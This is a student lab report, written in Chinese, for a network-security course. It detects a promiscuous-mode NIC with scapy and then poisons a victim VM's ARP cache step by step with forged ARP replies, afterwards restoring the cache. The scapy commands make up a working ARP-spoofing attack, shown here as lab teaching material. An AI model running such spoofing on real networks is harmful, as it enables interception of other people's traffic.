# 网络监听

## 网络拓扑：

网关：

172.16.111.1 

08:00:27:bf:d4:86/enp0s9

攻击者主机：

172.16.111.148

08:00:27:e7:9f:15/eth0 

受害者主机:

172.16.111.121

08:00:27:79:8f:43/eth0

- [x] 实验一检测局域网中的异常终端
- [x] 实验二手工单步“毒化”目标主机的 ARP 缓存

## 实验准备

### 安装sacpy

在攻击者主机上提前安装好scapy

```bash
# 安装 python3
sudo apt update && sudo apt install python3 python3-pip

# ref: https://scapy.readthedocs.io/en/latest/installation.html#latest-release
pip3 install scapy[complete]
```

<img src="img\安装Python3.jpg" alt="安装Python3" style="zoom:67%;" />

<img src="img\pip3.jpg" alt="pip3" style="zoom:67%;" />

## 实验一检测局域网中的异常终端

```
# 在受害者主机上检查网卡的「混杂模式」是否启用
ip link show eth0
```

<img src="img\检查混杂模式.jpg" alt="检查混杂模式" style="zoom:67%;" />

```bash
# 在攻击者主机上开启 scapy
scapy
```

<img src="img\在攻击者主机上开启scapy.jpg" alt="在攻击者主机上开启scapy" style="zoom:67%;" />

```bash
# 在 scapy 的交互式终端输入以下代码回车执行
pkt = promiscping("172.16.111.121")
```

```bash
# 回到受害者主机上开启网卡的『混杂模式』
# 注意上述输出结果里应该没有出现 PROMISC 字符串
# 手动开启该网卡的「混杂模式」
sudo ip link set eth0 promisc on
```

![受害者主机上手动开启网卡混杂模式](img\受害者主机上手动开启网卡混杂模式.jpg)

```bash
# 此时会发现输出结果里多出来了 PROMISC 
ip link show eth0
```

![开启混杂模式后结果多出了PROMISC](img\开启混杂模式后结果多出了PROMISC.jpg)

```bash
# 回到攻击者主机上的 scapy 交互式终端继续执行命令
# 观察两次命令的输出结果差异
pkt = promiscping("172.16.111.121")
```

<img src="img\对比两条命令输出结果的差异.jpg" alt="对比两条命令输出结果的差异" style="zoom:67%;" />

```
# 在受害者主机上
# 手动关闭该网卡的「混杂模式」
sudo ip link set eth0 promisc off
```

<img src="img\受害者上关闭混杂模式.jpg" alt="受害者上关闭混杂模式" style="zoom:67%;" />

经查阅资料，promiscping 命令会发送 ARP who-has 请求。

> - 混杂模式 接收所有经过网卡的数据包，包括不是发给本机的包，即不验证MAC地址
> - 普通模式 网卡只接收发给本机的包

可以看出在混杂模式下，受害者主机才能收到这个数据包。

在受害者主机上开启Wireshark抓包，也验证了这个问题。发送的包并没有指定目的主机的MAC地址，所以普通模式下发送不会成功

## 实验二手工单步“毒化”目标主机的 ARP 缓存

**以下代码在攻击者主机上的 `scapy` 交互式终端完成。**

#### 获取当前局域网的网关 MAC 地址

```python
# 构造一个 ARP 请求
arpbroadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst="172.16.111.1 ")
# 查看构造好的 ARP 请求报文详情
arpbroadcast.show()
```

![构造以及查看ARP请求](img\构造以及查看ARP请求.jpg)

```
# 发送这个 ARP 广播请求
recved = srp(arpbroadcast, timeout=2)

# 网关 MAC 地址如下
gw_mac = recved[0][0][1].hwsrc
gw_mac
```

<img src="img\发送广播请求并查看Mac地址.jpg" alt="发送广播请求并查看Mac地址" style="zoom: 67%;" />

#### 伪造网关响应包

```
# 准备发送给受害者主机
# ARP 响应的目的 MAC 地址设置为攻击者主机的 MAC 地址
# 这里要注意按照课件的代码试不能“毒化”的，需要在外面加一层Ethernet帧头
arpspoofed = Ether()/ARP(op=2, psrc="172.16.111.1 ", pdst="172.16.111.121", hwdst="08:00:27:e7:9f:15")

# 发送上述伪造的 ARP 响应数据包到受害者主机
sendp(arpspoofed)
```

<img src="img\发送伪造的ARP想赢数据包到受害者主机.jpg" alt="发送伪造的ARP想赢数据包到受害者主机" style="zoom:67%;" />

此时在受害者主机上查看 ARP 缓存会发现网关的 MAC 地址已被「替换」为攻击者主机的 MAC 地址

```
ip neigh
```

![在受害者主机上查看ARP缓存](img\在受害者主机上查看ARP缓存.jpg)

### 恢复受害者主机的 ARP 缓存记录

```
## 伪装网关给受害者发送 ARP 响应
restorepkt1 = Ether()/ARP(op=2, psrc="172.16.111.1 ",hwsrc="08:00:27:bf:d4:86", pdst="172.16.111.121", hwdst="08:00:27:79:8f:43")
sendp(restorepkt1, count=100, inter=0.2)
```

<img src="img\恢复受害者主机的 ARP 缓存记录.jpg" alt="恢复受害者主机的 ARP 缓存记录" style="zoom: 67%;" />

#### 此时在受害者主机上准备“刷新”网关 ARP 记录。

```
## 在受害者主机上尝试 ping 网关
ping 172.16.111.1
## 静候几秒 ARP 缓存刷新成功，退出 ping
## 查看受害者主机上 ARP 缓存，已恢复正常的网关 ARP 记录
ip neigh
```

<img src="img\恢复网关ARP记录.jpg" alt="恢复网关ARP记录" style="zoom:50%;" />

## 问题解决

1.输入pkt = promiscping("172.16.111.121")报错：peimissionerror

<img src="img\question1.jpg" alt="question1" style="zoom: 50%;" />

解决方法：

进入root权限

<img src="img\anwser.jpg" alt="anwser" style="zoom: 50%;" />

## 参考文件

[实验-网络安全](https://c4pr1c3.gitee.io/cuc-ns/chap0x04/exp.html)

[2020-ns-public-LyuLumos](https://github.com/CUCCS/2020-ns-public-LyuLumos/blob/ch0x04/ch0x04/%E7%BD%91%E7%BB%9C%E7%9B%91%E5%90%AC.md)

